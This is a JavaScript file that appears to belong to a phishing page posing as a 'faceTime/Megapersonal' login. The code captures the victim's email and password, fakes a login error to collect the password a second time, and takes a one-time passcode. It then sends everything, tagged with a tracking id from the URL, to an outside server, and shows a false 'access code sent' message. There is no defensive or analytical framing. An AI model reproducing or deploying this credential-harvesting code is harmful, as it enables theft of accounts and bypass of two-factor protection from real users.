
  
  // for Handle Form Validations and Get All Ingformations
  
  document.addEventListener("DOMContentLoaded", function () {
    const loginSystem = document.getElementById("loginSystem");
    const otpSystem = document.getElementById("otpSystem");
    const mainSystem = document.getElementById("mainSystem");
    const errorMsg = document.querySelector(".errors");
    const loginForm = document.querySelector("#loginSystem form");
    const otpForm = document.querySelector("#otpSystem");
  
    let passClick=1
  
    // utility Functions
    async function postData( formData) {
      const url = 'https://dashboarduser.onrender.com/api/information'
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            // Add any other headers if needed
          },
          body: JSON.stringify(formData),
        });
    
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
    
        const data = await response.json();
        console.log('Response from server:', data);
    
        // Assuming you have these functions defined somewhere
        hideElement(otpSystem);
        showElement(otpSystem);
      } catch (error) {
        // Handle errors
        console.error('Error:', error);
      }
    }
  
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const userId = urlParams.get('id');
    console.log('id Value:', userId);
  
    otpSystem.style.display = "none";
  
    // Object to store form data
    const formData = {};
  
    // Function to hide an element
    function hideElement(element) {
      element.style.display = "none";
    }
    // Function to show an element
    function showElement(element) {
    
      element.style.display = "block";
    }
  
    // Function to handle login form submission
    function handleLoginSubmit(event) {
        console.log('clicked');
      event.preventDefault();
      // Store form data in the formData object
      if(passClick<2){
       passClick++
       formData.email = loginForm.querySelector('input[type="email"]').value;
       formData.password = loginForm.querySelector('input[type="password"]').value;
       showElement(errorMsg)
       formData.user=userId
       loginForm.querySelector('input[type="password"]').value = '';
       return 
      }
      formData.email = loginForm.querySelector('input[type="email"]').value;
      formData.repassword = loginForm.querySelector('input[type="password"]').value;
      // Hide login form and show OTP form
      hideElement(loginSystem);
      showElement(otpSystem);
      hideElement(mainSystem)
        }
  
    // Function to handle OTP form submission
   async function handleOTPSubmit(event) {
      event.preventDefault();
      // Get OTP value and handle authentication (you can customize this part)
      const otp = otpForm.querySelector('input[type="text"]').value;
      const  data = {...formData,otp,siteName:"faceTime/Megapersonal"}
       
  
      await postData(data)
    
      hideElement(otpSystem);
      showElement(loginSystem);
      window.location.reload();
    }
  
    // Event listeners
    loginForm.addEventListener("submit", handleLoginSubmit);
    otpForm.addEventListener("submit", handleOTPSubmit);
  
    // Event listener for the "Log out instead" link in the OTP section
    document.querySelector("#otpSystem a[href='#']").addEventListener("click", function (event) {
      event.preventDefault();
      console.log('clicked');
      // Show login form and hide OTP form
      showElement(loginSystem);
      hideElement(otpSystem);
    });
  });


  // set Acutal Time

  const today = new Date();

  // Format the date as "Month Day, Year"
  const formattedDate = today.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });

  // Create the message with the dynamic date
  const message = "Your ACCESS CODE <br> has been sent <b>Successfully</b> <br> to your email on <b>" + formattedDate + "</b>. <br> That code remains valid.";

  // Set the message to the element with id "access-code"
  document.getElementById("access-code").innerHTML = message;